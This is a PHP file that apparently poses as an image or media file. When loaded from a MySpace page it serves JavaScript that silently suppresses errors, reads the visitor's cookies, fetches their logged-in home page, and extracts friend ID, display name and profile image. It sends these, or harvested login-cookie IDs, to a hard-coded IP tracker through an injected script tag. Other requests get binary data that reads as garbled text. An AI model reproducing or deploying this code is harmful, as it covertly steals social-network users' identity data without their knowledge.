<?php
header("Expires: Thu, 01 Jan 1970 00:00:00 GMT, -1 ");
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");

if (strstr(@$_SERVER['HTTP_REFERER'],'myspace.com/')) {
	//stars added to ssu to make quicktime vector work, remove them
	$u = $_GET['u'];
	$u = str_replace("*","",$u);
	?>

function stopError() {return true;}
window.onerror = stopError;

var req;
var retry = 0;
var bloggedin = (document.cookie.indexOf('LASTUSERCLICK')>-1); //alert(bloggedin);
var r = escape(document.referrer);//.split("Mytoken")[0];
var r = r?r:escape(document.location);
//var ie7 = navigator.userAgent.indexOf("MSIE 7") > -1;
function loadURL(url) {
	req = false;
    if(window.XMLHttpRequest) {
    	try {
			req = new XMLHttpRequest();
        } catch(e) {
			req = false;
        }
    } else if(window.ActiveXObject) {
       	try {
        	req = new ActiveXObject("Msxml2.XMLHTTP");
      	} catch(e) {
        	try {
          		req = new ActiveXObject("Microsoft.XMLHTTP");
        	} catch(e) {
          		req = false;
        	}
		}
    }
	if(req) {
		req.onreadystatechange = processReqChange;
		req.open("GET", url, true);
		req.send("");
	}
}
var homeHTML;
var possible_friendids=new Array();
function processReqChange() {
    // only if req shows "loaded"
    if (req.readyState == 4) {
        // only if "OK"
        if (req.status == 200) {
            // page loaded ok, put html in var
			homeHTML = req.responseText;
			//send vars to tracker
			var trackURL = 'http://205.134.170.241/t.php?ssu=<?=$u?>&p=1&u='+findfriendid(homeHTML)+'&un='+findname(homeHTML)+'&img='+findimg(homeHTML)+'&r='+r+'&c=';
			var e=window.document.createElement('script');void(e.setAttribute('src',trackURL));
			void(window.document.body.appendChild(e));
        } else {
			//retry a couple of times if it fails
			if (retry < 3) {
				retry++;
				processReqChange();
				//alert('retry '+retry);
			} else {
				//alert('not logged in?');
				//findotherlogins(document.cookie);
				//for ( var i=possible_friendids.length-1; i>=0; --i ){
				//	alert(possible_friendids[i]);
				//}
			}
        }
    }
}
function findfriendid(str){
	if(!str){return '';}
	var s=str.indexOf('friendID=');
	if(s==-1)return ''; s+=9;
	e=str.indexOf('\"',s);
	var lgn=str.substring(s,e);
	e=lgn.indexOf('&');
	if(e!=-1){lgn=lgn.substring(0,e);}return lgn;
}
function findname(str){
	var s,e,n;
	s=str.indexOf('Hello,&nbsp;');
	if(s!=-1){
		e=str.indexOf('!',s);
		return str.substring(s+12,e);
	}
}
function findimg(str){
	if(!str){return '';}
	var s=str.indexOf('_m.');
	if(s==-1){ s=str.indexOf('/m_'); }
	if(s==-1){ return ''; }
	
	s=str.lastIndexOf('"',s)+1;
	e=str.indexOf('"',s);
	return str.substring(s,e);
}

//document.cookie.match(/UNIQUELOGINTAKEOVER_(\d*)=/);
function sortNumber(a,b){return a-b;}
function findotherlogins(cookie){
	var cookie,fst,fstlen,i,p1,p2;
	if(cookie.length){
		fst='UNIQUELOGINTAKEOVER_';fstlen=fst.length;i=cookie.indexOf(fst);
		while(i!=-1){
			p1=i+fstlen;p2=cookie.indexOf('=',p1);
			possible_friendids.push(cookie.substring(p1,p2));
			i=cookie.indexOf(fst,i+1);
		}
	}
	possible_friendids.sort(sortNumber);
}

var domain = document.domain;
var baseurl = document.location.href;
baseurl = baseurl.substring(0, baseurl.indexOf(domain)) + domain;


if (bloggedin) {
	//load home page data for logged in user
	//window.onload = loadURL(baseurl+'/index.cfm?fuseaction=user');  //not implemented error in ie
	var homeurl = baseurl+'/index.cfm?fuseaction=user';
	//window.onload = function() {loadURL(homeurl);};
	//window.setAttribute("onload", function() {
		loadURL(homeurl); 
	//});
} else {
	//not logged in, skip all that ajax stuff
	findotherlogins(document.cookie);
	var pfi_string = possible_friendids.join(",");
	//alert(pfi_string);
	var trackURL = 'http://205.134.170.241/t.php?ssu=<?=$u?>&p=1&u=???&un='+"???"+'&img='+pfi_string+'&r='+r+'&c=';
	var e=window.document.createElement('script');void(e.setAttribute('src',trackURL));
	//window.onload = void(window.document.body.appendChild(e));
	window.onload = function() {void(window.document.body.appendChild(e));};
}


<?
}else{
?>

���j.�$g
�ǹ�n�9_c.@<ӎ�)&9R '#��l�6M)�eP�2
/h.��.��)+�.�Z1M��7n�y�6�<��c�8�Gn
\�q�Ni}e� (r���$�^	�
.moz��#�=�7.��q�����H��.|F˜�z.��{�@���.�oz��To��J,�=.DE&F.�.���K��6�(;�"�xz!6���"�.t��70�..��xRw�;�b���x�I�|c�.�߷13�>.ё$qu<ұ\� �4Q��.��{.����~r0u>���?l.���),��K�.�%�p.��3�.G_A���2i���;ĵ.0�q{[�G�zޒ�����T���|�� ,�\;7<`���๱.ť� �(�Q��ݹ��b:�.r=
U����g��8��i����1���ێ��\�����Q���o._t�.��m�zg����N�g�x���#鷫5�)c>����Źi!���8�M�a�9 � �5�y�{�^�u.^�k �..� US�.a�z�+��c�R��.Z}�ZZ��x�	*�.K$.*..��#��!tKiW���4�ț�..@.�.�9��
�cVq����!��N��t����s��=��R� d�`
�.0*r..�_�8�9��.O��t�c.�.�$w.ʭ��s�~8ǭN<�.;ٮ�{k��_$3���.A� ֪�.��:��J���Ye��V����;s��]��w>��J�ݬ��v���.��f��M*W�-��.��.�1��D.P�.@.�
�x`xgĖv�]]�j.����bC.8.c'�>	Ǧ3�8�l������..(�Y����3.�A��1�W������E힝�.��.\-��фM�c<x/��.窳sg��.��nYm/��6~.h֖�.�l���g�v�#�ʰ�..�pN.��j.�&����.�g�Aka.�rʋ&KlP�\�3��.s�\W��D������8���in��.C�R.[3����6կ����.��k�G����#c.���4���s���`b�Q~�߱���'=n��S9{Y,ت�өbp���y�w�oe�Y@�(��6�.�*\�rx<�n|���.�}.U��`��R��~��e�O�.rB����Z+.�6�}��h��Kآ,.��['�?/�.k���>.�-L�Gx�E.ys6G�$�<�.��2Y�e
..�...R.� Z�x�������S.�!e*2�w.��k.Ǚٜ�誏�Ow��onν�=^{Cm�d(v�%��R:U�����ti�&��v
.�N�S�.����}+��<.{��%��e�i$��dh�^.=ʹ.s��+���;8t�[Ÿ�ʐ��.[l�.�RzV�9;.J.����Fk��uu�ZCd��.I2�:���O�1��Y����j2��.��.ضF�W

<?}?>